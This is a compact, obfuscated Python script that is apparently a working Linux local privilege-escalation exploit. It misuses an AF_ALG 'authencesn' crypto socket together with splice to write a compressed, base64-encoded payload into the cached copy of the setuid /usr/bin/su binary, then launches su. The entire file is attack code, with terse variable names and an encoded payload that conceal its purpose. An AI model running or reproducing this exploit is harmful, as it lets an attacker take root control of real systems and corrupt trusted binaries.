#!/usr/bin/env python3
import os as g,zlib,socket as s
from base64 import b64decode as q
def c(f,t,c):
	a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha1),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,q('CAABAAAAAB'+'A'*44+'=='));v(h,5,None,4);u,_=a.accept();o=t+4;i=b'\0';u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\20'+i*19),(h,4,b'\10'+i*3),],1<<15);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
	try:u.recv(8+t)
	except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(q("eNqrd/VxY2JkZIABJgY7BhCvgsEBzHdgwAQODBYMMB0gmhVNFpmeB+XBaAYBCGV4wPD/hkx+Vo9eW34Q91uWdcRMflbD/1k2Efys+kmZefrFGQwMDAAywxDT"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")